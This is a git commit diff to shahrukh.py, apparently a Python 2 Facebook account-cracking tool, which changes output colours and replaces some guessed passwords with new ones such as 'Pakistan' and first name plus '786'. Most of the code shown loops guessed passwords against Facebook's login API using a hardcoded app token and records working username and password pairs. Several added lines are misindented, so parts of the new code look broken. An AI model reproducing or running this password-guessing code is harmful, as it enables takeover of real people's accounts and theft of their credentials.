741a1dda914a20ce17d08b69d9b4f1baab33ac42
mishi786 <68304964+mishi786@users.noreply.github.com>
2020-11-12 02:08:33 +0500

    Update shahrukh.py

--- shahrukh.py
+++ shahrukh.py
@@ -259,7 +259,7 @@ def crack_menu():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass1
+				print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
@@ -273,7 +273,7 @@ def crack_menu():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass2
+						print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
@@ -287,7 +287,7 @@ def crack_menu():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
-								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass3
+								print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
@@ -301,7 +301,7 @@ def crack_menu():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
-										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass4
+										print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
@@ -315,7 +315,7 @@ def crack_menu():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
-												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass5
+												print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass5
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
@@ -325,33 +325,33 @@ def crack_menu():
 													crt.close()
 													checkpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '123456'
+													pass6 = b['first_name'] + '786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
-														print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass6
+														print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass6
 														oks.append(user+pass6)
 													else:
-														if "www.facebook.com" in q["error_msg"]:
-															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass6
-															crt = open("save/checkpoint.txt", "a")
-															crt.write(user+"|"+pass6+"\n")
-															crt.close()
-															checkpoint.append(user+pass6)
+														pass7 = 'Pakistan'
+														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													        q = json.load(data)
+													        if "access_token" in q:
+														        print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass7
+														        oks.append(user+pass7)
 														else:
-															pass7 = b['first_name'] + '786'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															pass8 = 'Pakistan1'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
-																print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass7
-																oks.append(user+pass7)
+																print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass8
+																oks.append(user+pass8)
 															else:
-																if "www.facebook.com" in q["error_msg"]:
-																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass7
-																	crt = open("save/checkpoint.txt", "a")
-																	crt.write(user+"|"+pass7+"\n")
-																	crt.close()
-																	checkpoint.append(user+pass7)           					
+																pass9 = 'pakistan'
+															        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															        q = json.load(data)
+															        if "access_token" in q:
+																        print '\x1b[1;94m[\x1b[1;94mSuccessful\x1b[1;94m]\x1b[1;94m ' + user + ' \x1b[1;94m|\x1b[1;94m ' + pass9
+																        oks.append(user+pass9)        					
 								                                       
 				                                                                           
 	
